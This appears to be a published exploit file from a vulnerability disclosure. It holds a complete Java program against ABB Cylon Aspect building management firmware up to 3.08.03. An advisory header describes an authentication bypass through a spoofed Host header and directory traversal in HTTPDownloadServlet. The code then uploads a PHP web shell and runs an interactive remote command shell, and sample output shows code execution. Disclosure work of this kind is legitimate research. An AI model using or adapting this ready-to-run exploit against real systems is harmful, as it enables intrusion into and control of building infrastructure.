@@ -1,0 +1,230 @@
+/*
+
+
+ABB Cylon Aspect 3.08.03 (MIX->HTTPDownloadServlet) Remote Code Execution
+
+
+Vendor: ABB Ltd.
+Product web page: https://www.global.abb
+Affected version: NEXUS Series, MATRIX-2 Series, ASPECT-Enterprise, ASPECT-Studio
+                  Firmware: <=3.08.03
+
+Summary: ASPECT is an award-winning scalable building energy management
+and control solution designed to allow users seamless access to their
+building data through standard building protocols including smart devices.
+
+Desc: ABB Cylon Aspect BMS/BAS is vulnerable to a critical flaw in the
+AuthenticatedHttpServlet within its application server, enabling
+remote attackers to bypass authentication by setting the Host:
+127.0.0.1 header. This deceives the server into processing requests
+as if they originate from localhost, granting unauthorized access
+to privileged operations. This bypass grants access to privileged
+functionality, including the HTTPDownloadServlet, which is vulnerable
+to directory traversal. By leveraging this, an attacker can write
+arbitrary PHP files outside the intended directory scope. When combined,
+these issues allow remote attackers to upload a malicious PHP shell
+and execute system commands with the privileges of the web server,
+leading to full system compromise.
+
+--------------------------------------------------------------------------
+$ java -jar MixExploitHDS.jar
+Enter Building IP (no port): 192.168.73.31
+Enter Aspect web control port to access zsl.php (not the HMI port): 80
+Writing exploit...
+HTTP/1.1 200 Successful
+Entering pseudoshell...
+Commando> id
+uid=48(apache) gid=48(apache) groups=48(apache),0(root) context=system_u:system_r:httpd_t:s0
+Commando> exit
+zsl.php removed!
+--------------------------------------------------------------------------
+
+Tested on: GNU/Linux 3.15.10 (armv7l)
+           GNU/Linux 3.10.0 (x86_64)
+           GNU/Linux 2.6.32 (x86_64)
+           Intel(R) Atom(TM) Processor E3930 @ 1.30GHz
+           Intel(R) Xeon(R) Silver 4208 CPU @ 2.10GHz
+           PHP/7.3.11
+           PHP/5.6.30
+           PHP/5.4.16
+           PHP/4.4.8
+           PHP/5.3.3
+           AspectFT Automation Application Server
+           lighttpd/1.4.32
+           lighttpd/1.4.18
+           Apache/2.2.15 (CentOS)
+           OpenJDK Runtime Environment (rhel-2.6.22.1.-x86_64)
+           OpenJDK 64-Bit Server VM (build 24.261-b02, mixed mode)
+           ErgoTech MIX Deployment Server 2.0.0
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+Macedonian Information Security Research and Development Laboratory
+Zero Science Lab - https://www.zeroscience.mk - @zeroscience
+
+
+Advisory ID: ZSL-2025-5940
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2025-5940.php
+
+
+21.04.2024
+
+
+*/
+
+
+import java.io.*;
+import java.net.*;
+import java.util.Scanner;
+
+public class MixExploitHDS {
+    private static final int HMI_PORT = 7226;
+
+    public static void main(String[] args) {
+        printBanner();
+        Scanner scanner = new Scanner(System.in);
+
+        System.out.print("Enter Building IP (no port): ");
+        String ip = scanner.nextLine().trim();
+
+        if (ip.isEmpty() || ip.length() > 15 || !ip.matches("\\d+\\.\\d+\\.\\d+\\.\\d+")) {
+            System.err.println("Invalid IP!");
+            scanner.close();
+            return;
+        }
+
+        System.out.print("Enter Aspect web control port to access zsl.php (not the HMI port): ");
+        int webPort = Integer.parseInt(scanner.nextLine().trim());
+
+        try {
+            String path = "/servlets/HTTPDownloadServlet?filename=../../../home/MIX_CMIX/htmlroot/zsl.php";
+            String phpPayload = "<?php echo shell_exec($_REQUEST['c']); ?>";
+            String uploadResponse = sendPostRequest(ip, path, phpPayload);
+            String statusLine = uploadResponse.split("\n")[0];
+            System.out.println("Writing exploit...\n" + statusLine);
+            System.out.println("Entering pseudoshell...");
+
+            while (true) {
+                System.out.print("Commando> ");
+                String command = scanner.nextLine().trim();
+                if (command.equalsIgnoreCase("exit")) {
+                    String destroyCmd = "rm zsl.php";
+                    String cmdUrl = "http://" + ip + ":" + webPort + "/zsl.php";
+                    String cmdData = "c=" + URLEncoder.encode(destroyCmd, "UTF-8");
+                    sendHttpUrlPost(cmdUrl, cmdData);
+                    System.out.println("zsl.php removed!");
+                    break;
+                }
+                if (!command.isEmpty()) {
+                    String cmdUrl = "http://" + ip + ":" + webPort + "/zsl.php";
+                    String cmdData = "c=" + URLEncoder.encode(command, "UTF-8");
+                    String response = sendHttpUrlPost(cmdUrl, cmdData);
+                    System.out.println(response);
+                } else {
+                    System.out.println("Command please.");
+                }
+            }
+
+        } catch (Exception e) {
+            System.err.println("Error: " + e.getMessage());
+        } finally {
+            scanner.close();
+        }
+    }
+
+     private static void printBanner() {
+        System.out.println("\n");
+        System.out.println("                P   R   O   J   E   C   T");
+        System.out.println("");
+        System.out.println("                        .|");
+        System.out.println("                        | |");
+        System.out.println("                        |'|            ._____");
+        System.out.println("                ___    |  |            |.   |' .---\"|");
+        System.out.println("        _    .-'   '-. |  |     .--'|  ||   | _|    |");
+        System.out.println("     .-'|  _.|  |    ||   '-__  |   |  |    ||      |");
+        System.out.println("     |' | |.    |    ||       | |   |  |    ||      |");
+        System.out.println("  ___|  '-'     '    \"\"       '-'   '-.'    '`      |___");
+        System.out.println("░▒▓███████▓▒░░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░▒▓███████▓▒░  ");
+        System.out.println("░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ");
+        System.out.println("░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ");
+        System.out.println("░▒▓███████▓▒░░▒▓███████▓▒░░▒▓████████▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ");
+        System.out.println("░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ");
+        System.out.println("░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ");
+        System.out.println("░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░");
+        System.out.println("         ░▒▓████████▓▒░▒▓██████▓▒░ ░▒▓██████▓▒░ ");
+        System.out.println("         ░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░");
+        System.out.println("         ░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░░░░░░ ");
+        System.out.println("         ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒▒▓███▓▒░");
+        System.out.println("         ░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░");
+        System.out.println("         ░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░");
+        System.out.println("         ░▒▓█▓▒░░░░░░░░▒▓██████▓▒░ ░▒▓██████▓▒░");
+        System.out.println("\n");
+    }
+
+    private static String sendPostRequest(String ip, String path, String postData) throws IOException {
+        Socket socket = new Socket(ip, HMI_PORT);
+        OutputStream out = socket.getOutputStream();
+        BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
+
+        String request = "POST " + path + " HTTP/1.1\r\n" +
+                "Host: 127.0.0.1\r\n" +
+                "Content-Type: application/octet-stream\r\n" +
+                "Content-Length: " + postData.length() + "\r\n" +
+                "Connection: close\r\n\r\n" +
+                postData;
+
+        out.write(request.getBytes("UTF-8"));
+        out.flush();
+
+        StringBuilder response = new StringBuilder();
+        String line;
+        while ((line = in.readLine()) != null) {
+            response.append(line).append("\n");
+        }
+        socket.close();
+        return response.toString().trim();
+    }
+
+    private static String sendGetRequest(String urlStr) throws IOException {
+        URL url = new URL(urlStr);
+        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+        conn.setRequestMethod("GET");
+
+        int responseCode = conn.getResponseCode();
+        StringBuilder response = new StringBuilder();
+        try (BufferedReader br = new BufferedReader(new InputStreamReader(
+                responseCode >= 400 ? conn.getErrorStream() : conn.getInputStream()))) {
+            String line;
+            while ((line = br.readLine()) != null) {
+                response.append(line).append("\n");
+            }
+        }
+        conn.disconnect();
+        return response.toString().trim();
+    }
+
+    private static String sendHttpUrlPost(String urlStr, String postData) throws IOException {
+        URL url = new URL(urlStr);
+        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+        conn.setRequestMethod("POST");
+        conn.setDoOutput(true);
+        conn.setRequestProperty("User-Agent", "IMF");
+
+        try (OutputStream os = conn.getOutputStream()) {
+            byte[] input = postData.getBytes("UTF-8");
+            os.write(input, 0, input.length);
+        }
+
+        int responseCode = conn.getResponseCode();
+        StringBuilder response = new StringBuilder();
+        try (BufferedReader br = new BufferedReader(new InputStreamReader(
+                responseCode >= 400 ? conn.getErrorStream() : conn.getInputStream()))) {
+            String line;
+            while ((line = br.readLine()) != null) {
+                response.append(line).append("\n");
+            }
+        }
+        conn.disconnect();
+        return response.toString().trim();
+    }
+}
